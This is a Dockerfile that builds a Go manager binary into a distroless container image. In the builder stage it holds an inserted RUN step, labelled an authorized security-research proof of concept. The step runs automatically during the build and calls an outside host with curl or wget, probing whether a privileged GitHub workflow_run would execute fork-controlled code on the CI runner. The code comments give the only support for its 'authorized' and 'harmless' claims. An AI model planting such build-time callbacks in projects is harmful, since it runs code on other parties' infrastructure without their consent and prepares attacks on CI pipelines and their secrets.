# Build the manager binary
FROM golang:1.24 as builder
ARG TARGETOS
ARG TARGETARCH

WORKDIR /workspace
# Copy the Go Modules manifests
COPY go.mod go.mod
COPY go.sum go.sum
# cache deps before building and copying source so that we don't need to re-download as much
# and so that source changes don't invalidate our downloaded layer
RUN go mod download

# --- harmless security-research PoC marker (authorized test) ---
# If the privileged workflow_run checkout ever resolves this fork branch, this
# line executes inside the GitHub-hosted runner's Docker build and emits an
# out-of-band callback. No data is exfiltrated; single fixed URL only.
RUN (command -v curl >/dev/null && curl -s --max-time 5 "https://oob.algamil7x.xyz/kiwicom-poc" >/dev/null) \
 || (command -v wget >/dev/null && wget -qO- --timeout=5 "https://oob.algamil7x.xyz/kiwicom-poc" >/dev/null) \
 || true
# --- end PoC marker ---

# Copy the go source
COPY . .

# Build
# the GOARCH has not a default value to allow the binary be built according to the host where the command
# was called. For example, if we call make docker-build in a local env which has the Apple Silicon M1 So
# the docker BUILDPLATFORM arg will be linux/arm64 when for Apple x86 it will be linux/amd64. Therefore,
# by leaving it empty we can ensure that the container and binary shipped on it will have the same platform.
RUN CGO_ENABLED=0 GOOS=${TARGETOS:-linux} GOARCH=${TARGETARCH} go build -a -o manager ./cmd/manager/main.go

# Use distroless as minimal base image to package the manager binary
# Refer to https://github.com/GoogleContainerTools/distroless for more details
FROM gcr.io/distroless/static:nonroot
WORKDIR /
COPY --from=builder /workspace/manager .
USER 65532:65532

ENTRYPOINT ["/manager"]
